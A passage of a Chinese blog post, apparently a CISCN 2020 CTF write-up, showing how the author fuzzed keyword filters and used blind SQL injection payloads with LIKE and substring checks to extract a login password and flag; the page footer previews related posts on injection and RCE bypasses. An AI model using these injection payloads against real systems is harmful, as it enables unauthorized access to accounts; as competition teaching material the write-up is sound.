+<p>Fuzz一下被禁止的关键词, mid可用, select只被过滤了一次可以用来绕过其他被禁止的关键字</p>
+<p>结果为真的话返回 Too young too simple, 假的话返回 Incorrect password</p>
+<p><code>'or/**/'1'like'1'%00  真</code><br>
+<code>'or/**/'1'like'1'#    假</code></p>
+<p>fuzz了好长时间… 觉得逻辑非常奇怪,后来发现应该是注释符的问题…</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914004744178.png" alt="image-20200914004744178"></p>
+<p>Payload: <code>'or/**/subselectstr(password,1,1)like'w'%00</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914004830950.png" alt="image-20200914004830950"></p>
+<p>在burpsuite中爆破出密码 <code>w31c0mE 4nd H ve FuN</code></p>
+<p>转义字符被禁止了所以无法爆破下划线,百分号等特殊字符,<br>
+所以对密码进行爆破,空格地方用下划线代替,H ve中间爆破出是百分号</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914004904619.png" alt="image-20200914004904619"></p>
+<p>用帐号密码登录就可</p>
+<p><code>ciscn&#123;UjSmH9SCD6zuZUAc5g&#125;</code></p>
+<p>第一次在国赛上拿到3血的题目</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914003403226.png" alt="image-20200914003403226"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://991688344.github.io">LYC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://991688344.github.io/2020/09/13/2020ciscn/">http://991688344.github.io/2020/09/13/2020ciscn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://991688344.github.io" target="_blank">Rick</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post-share"><div class="social-share" data-image="/images/Wallpaper/rainbowcat.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/10/03/awk%E5%91%BD%E4%BB%A4/" title="awk命令"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">awk命令</div></div><div class="info-2"><div class="info-item-1">log.txt文本内容如下： 12342 this is a test3 Are you like awkThis&#x27;s a test10 There are orange,apple,mongo 1234567891011121314ls -l | awk &#x27;&#123;print $1,$5&#125;&#x27; 					$n 代表输出第几列ls -l | awk &#x27;&#123;print $1,$5&#125;&#x27; OFS=&quot; | &quot;      			OFS标识以 &quot; | &quot; 对输出结果分割awk -F, &#x27;&#123;print $1,$2&#125;&#x27;   log.txt			# -F, 使用&quot;,&quot;分割awk &#x27;$1&gt;2&#x27; log.txt 		过滤第一列大于2的行 awk &#x27;$1==2 &#123;print $1,$3&#125;&#x27; log.txt    #过滤第一列等于2的行，输出1，3列ls -l...</div></div></div></a><a class="pagination-related" href="/2020/06/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java反序列化</div></div><div class="info-2"><div class="info-item-1">java序列化操作函数 实现Serializable接口 ObjectOutputStream类的writeObject(Object obj)方法,将对象序列化成字符串数据 ObjectInputStream类的readObject(Object obj)方法，将字符串数据反序列化成对象 12345678910111213public class Person implements Serializable &#123;   	private String name;   	private int age;   //省略构造方法，get及set方法   	private void writeObject(ObjectOutputStream out) throws IOException &#123;       //将名字反转写入二进制流       		out.writeObject(new StringBuffer(this.name).reverse());       		out.writeInt(age);       &#125;      ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/02/25/2018%E6%8A%A4%E7%BD%91%E6%9D%AF/" title="2018护网杯"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-25</div><div class="info-item-2">2018护网杯</div></div><div class="info-2"><div class="info-item-1">这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）;  flag文件名题目已给出 /fllllllllllag    ...</div></div></div></a><a class="pagination-related" href="/2019/12/05/2019%E6%B7%B1%E6%80%9D%E6%9D%AF/" title="2019深思杯"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-05</div><div class="info-item-2">2019深思杯</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2020/03/09/0CTF2016/" title="0CTF2016"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-09</div><div class="info-item-2">0CTF2016</div></div><div class="info-2"><div class="info-item-1">piapiapia  数组绕过正则 反序列化长度问题导致的尾部字符逃逸   顺手存一下图片~  输入admin@admin（@表示分割姓名密码）提示Invalid user name or password 输入admin@1提示Invalid password 输入admin@asd提示Invalid user name or password 输入admin@123提示Invalid user name or password 输入sadaaaaaa@asdddd提示Invalid user name 输入username=aaaaaaaaaabbbbbbb&amp;password=21提示Invalid user name 输入username=aaaaaaaaaabbbbb&amp;password=22提示Invalid password 输入username=aaaaaaaaaabbbbbb&amp;password=211提示Invalid user name or password 貌似和长度有关系，但是没看到有啥用 扫一下目录发现 12Dir found:...</div></div></div></a><a class="pagination-related" href="/2020/03/10/BUUCTF2018/" title="BUUCTF2018"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-10</div><div class="info-item-2">BUUCTF2018</div></div><div class="info-2"><div class="info-item-1">Online Tool  RCE  123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host = $_GET[&#x27;host&#x27;];    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);    echo &#x27;you are in...</div></div></div></a><a class="pagination-related" href="/2020/02/28/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA/" title="CISCN2019华北赛区"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-28</div><div class="info-item-2">CISCN2019华北赛区</div></div><div class="info-2"><div class="info-item-1">Hack World 搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等，包括/**/，后来看源码知道是过滤了*。 有意思的是输入1/1时会正常返回结果，可以判断这是数字型的sql注入。 根据1和2返回结果的不同，可能是bool盲注，()没有过滤，可以使用大部分函数,空格的绕过有这些方法我测试是可以的 %09 %0a %0b %0c %0d /**/ /*!*/或者直接tab %20 好像没法绕，%00截断好像也影响sql语句的执行 或者用括号也可以。任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 本题中可以if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2) 写个脚本跑一下(本地测试的 buu复现的环境网络不行所以必须加延时,时间太久了) 1234567891011121314151617181920212223242526272829303132333435363738394041import...</div></div></div></a><a class="pagination-related" href="/2020/05/07/CTF%E4%B8%AD%E7%9A%84htaccess/" title="CTF中的htaccess"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-07</div><div class="info-item-2">CTF中的htaccess</div></div><div class="info-2"><div class="info-item-1">服务器中间件为apache，因此想到了传.htaceess来解析php，通常我们用 .htaccess来解析非php后缀文件时用到 AddType application/x-httpd-php .ppp 或者 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; auto_append_file和auto_prepend_file 相关bypass 如果文件末尾被自动加上一句话,会导致服务器500错误,这时候可以在最后添加#\ 将换行转义成普通字符 如果特殊字符被实体编码, 可以通过特殊编码来绕过   相关比赛 XNUCA2019Qualifier </div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC80NzA1My8yMzU1Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LYC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Day 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Web3"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 Web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Web7"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 Web7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">数组</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8D%E5%8F%AF%E4%BF%AE%E6%94%B9"><span class="toc-number">1.2.1.1.1.</span> <span class="toc-text">不可修改</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E4%BF%AE%E6%94%B9"><span class="toc-number">1.2.1.1.2.</span> <span class="toc-text">可修改</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Map"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Map</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">[] 运算符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#new"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">new</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T-class"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">T(class)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%9Ajava-lang-Runtime"><span class="toc-number">1.2.2.</span> <span class="toc-text">尝试构造命令执行：java.lang.Runtime</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-T"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">绕过 T(</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-getRuntime"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">获取 getRuntime</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">exec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%9E%84%E9%80%A0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%9Ajava-nio"><span class="toc-number">1.2.3.</span> <span class="toc-text">尝试构造读取文件：java.nio</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87new"><span class="toc-number">1.2.3.1.1.</span> <span class="toc-text">绕过new(</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87get"><span class="toc-number">1.2.3.1.2.</span> <span class="toc-text">绕过get(</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E7%AC%A6%E8%8E%B7%E5%8F%96"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">逐字符获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">直接读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">构造遍历目录方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">获取flag内容</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Day2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Web2"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Web5"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Web5</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护"><img src="/images/Wallpaper/rainbowcat.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="4GPU服务器环境配置及维护"/></a><div class="content"><a class="title" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护">4GPU服务器环境配置及维护</a><time datetime="2023-08-29T12:00:26.000Z" title="发表于 2023-08-29 20:00:26">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="UEFI+systemd开机启动流程"/></a><div class="content"><a class="title" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程">UEFI+systemd开机启动流程</a><time datetime="2023-08-29T08:39:54.000Z" title="发表于 2023-08-29 16:39:54">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="udev配置Linux网络接口"/></a><div class="content"><a class="title" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口">udev配置Linux网络接口</a><time datetime="2023-08-27T12:49:29.000Z" title="发表于 2023-08-27 20:49:29">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="实验室服务器网络运维"/></a><div class="content"><a class="title" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维">实验室服务器网络运维</a><time datetime="2023-08-27T12:20:23.000Z" title="发表于 2023-08-27 20:20:23">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="Attention机制_transformer"/></a><div class="content"><a class="title" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer">Attention机制_transformer</a><time datetime="2022-11-21T11:55:15.000Z" title="发表于 2022-11-21 19:55:15">2022-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By LYC</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+
+  const loadLivere = (el, path) => {
+    window.livereOptions = {
+      refer: path || location.pathname
+    }
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyLivere = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if (isShuoshuo) {
+    'Livere' === 'Livere'
+      ? window.shuoshuoComment = { loadComment: loadLivere }
+      : window.loadOtherComment = loadLivere
+    return
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
